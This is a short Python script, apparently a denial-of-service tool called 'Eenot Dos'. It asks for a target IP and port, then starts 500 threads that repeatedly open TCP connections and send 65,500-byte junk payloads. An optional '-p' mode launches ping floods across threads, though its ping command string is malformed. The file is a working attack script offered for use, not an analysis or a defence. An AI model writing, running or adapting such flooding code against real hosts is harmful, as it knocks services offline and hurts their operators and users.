'''
Dos(Raw)
'''
import socket
import subprocess as sub
import threading,sys
ip = ''
def DosP():    
    while True:
        try:
            sub.run(command,shell=False,check=False)
        except:
            continue
        
def Dos(ip,port):
    while True:
        sc = socket.socket()
        try:
            sc.connect((ip,port))
        except:
            pass

        while True:
            dt = 'q'*65500
            try:
                sc.send(dt.encode('utf-8'))
               
            except:
                sc.close()
                break
        
    
    

def CheckIps(port):
    global ip
    n = 500
    
    e = []
    t = []
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Eenot Dos~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nDon`t use -p func, standart dos better")
    if port == 'a':
        n = 10
        for i in range(n+1):
            e.append(threading.Event())
        for i in range(n):
            t.append(threading.Thread(target = DosP, args=()))

        for i in range(n):
            try:
                t[i].start()
            except:
                pass
        for i in range(n):
            try:        
                e[i].set()
            except:
                pass
        for i in range(n):
            try:        
                t[i].join()
            except:
                pass
    else:    
        for i in range(n):
            t.append(threading.Thread(target = Dos, args=(ip,port)))
        for i in range(n):
            try:
                t[i].start()
            except:
                pass
        for i in range(n):
            try:
                t[i].join()
            except:
                pass
try:
    if sys.argv[1] == '-p':
        IP = sys.argv[2]
        #print('OK')
        command = 'ping -n 1 -l/ 65500 '+IP
        #print('OK')
        CheckIps('a')
    else:
        print('invalid argument')
        print('Usage: -p(optional) ip(optional)')
        pass 
except:          
    PR = int(input("Port : "))
    ip = input("IP : ")
    CheckIps(PR)
CheckIps('a')



